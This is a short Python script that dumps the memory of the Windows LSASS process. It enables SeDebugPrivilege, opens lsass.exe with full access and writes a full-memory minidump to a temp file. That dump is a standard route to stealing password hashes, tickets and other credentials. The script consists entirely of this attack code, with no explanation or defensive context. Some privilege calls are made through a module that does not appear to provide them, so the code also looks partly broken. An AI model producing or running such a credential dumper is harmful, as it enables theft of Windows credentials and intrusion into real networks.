import win32api, win32file, win32con, psutil, ctypes
from ctypes import wintypes

hToken = win32api.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_ADJUST_PRIVILEGES)
priv_id = win32api.LookupPrivilegeValue(None, "SeDebugPrivilege")
win32api.AdjustTokenPrivileges(hToken, False, [(priv_id, win32con.SE_PRIVILEGE_ENABLED)])

pid = next((p.pid for p in psutil.process_iter() if p.name().lower() == "lsass.exe"), None)
hLsass = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
dump_file = r"C:\\Temp\\lsass_dump.dmp"
hFile = win32file.CreateFile(dump_file, win32con.GENERIC_WRITE, 0, None, win32con.CREATE_ALWAYS, 0, None)

dbghelp = ctypes.windll.dbghelp
MiniDumpWithFullMemory = 0x2
success = dbghelp.MiniDumpWriteDump(
    hLsass.handle, pid, hFile.handle, MiniDumpWithFullMemory, None, None, None)
print("Dump successful" if success else f"Error: {ctypes.GetLastError()}")
